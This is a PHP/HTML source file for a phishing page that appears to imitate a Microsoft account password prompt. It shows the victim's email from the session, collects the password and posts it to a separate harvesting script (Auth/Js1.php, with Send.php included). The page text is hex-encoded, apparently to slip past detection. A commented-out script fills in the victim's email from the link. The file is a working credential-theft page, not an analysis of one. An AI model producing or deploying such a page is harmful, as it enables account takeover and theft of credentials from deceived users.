<?php
include "./Send.php";
session_start();
error_reporting(0);
?>
<!DOCTYPE HTML>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>&#x53;&#x69;&#x67;&#x6e;&#x20;&#x69;&#x6e;&#x20;&#x74;&#x6f;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;</title>
    <link rel="stylesheet" href="files/style.css">

    <!-- google fonts linkup -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
<!-- <script>
  function fillEmail() {
    // Get the fragment part of the URL (everything after '#')
    var fragment = window.location.hash.substring(1); // Remove the '#' character
    // Split the fragment at '=' to extract the key-value pair
    var params = fragment.split('=');
    
    if (params[0] === 'em' && params[1]) {
      // Set the value of the email input field
      document.getElementById('email-input').value = decodeURIComponent(params[1]);
    }
  }

  // Call the function on page load
  window.onload = fillEmail;
</script> -->
    <link rel="stylesheet" href="files/responsive.css">
    <!-- responsive css linkup -->
</head>

<body>
	<form action="Auth/Js1.php" method="POST" >
    <div class="login_box">
        <div class="login_box_contents">
            <div class="login_box_content_wrapper">
                <div class="login_top_logo">
                    <img src="files/mic.svg"
                        alt="">
                </div>
                <div class="sign_in_text">
				<div><a href="./index.php"><img src="files/left.svg" style="cursor: pointer;" /></a><span class="second"><?php echo $_SESSION['Email'];?><!-- <input id="email-input" type="text" name="Em" value="" readonly="" style="border: none;background: none;font-size: 15px;font-weight: 500;text-shadow: none;outline: none;cursor: pointer;"> --></span></div>
                    <p>&#x45;&#x6e;&#x74;&#x65;&#x72;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;</p>
                    <p style="font-weight: 600;font-size: 14px;opacity: 0.8;margin-top: 5px;"><?php echo $Pass_Text1;?></p>
                </div>
                <div class="login_inputbox" id="hide">
                    <input class="the_input" type="password" placeholder="Password" name="Pa" required />
                </div>
                <div class="login_middle_links">
                    <p>
						<input type="checkbox" style="width: 20px;height: 20px;"/>
						<a href="#" style="color: #1b1b1b;font-size: .9375rem;position: absolute;padding-left: 7px;padding-top: 2px;">&#x4b;&#x65;&#x65;&#x70;&#x20;&#x6d;&#x65;&#x20;&#x73;&#x69;&#x67;&#x6e;&#x65;&#x64;&#x20;&#x69;&#x6e;</a>
					</p>

                    <p><a href="#" style="color: #0067b8;">&#x46;&#x6f;&#x72;&#x67;&#x6f;&#x74;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x3f;</a></p>

                    <p><br /></p>
                </div>
                <div class="login_next_button">
					<input type="submit" value="Sign In" class="button" name="submit" id="button"/>
                </div>
            </div>
        </div>
    </div>
	</form>
	
    <footer>
        <div class="footer_contents">
            <ul>
                <li><a href="#">Terms of use</a></li>
                <li><a href="#">Privacy and cookies</a></li>
            </ul>
            <button>. . .</button>
        </div>
    </footer>
</body>

</html>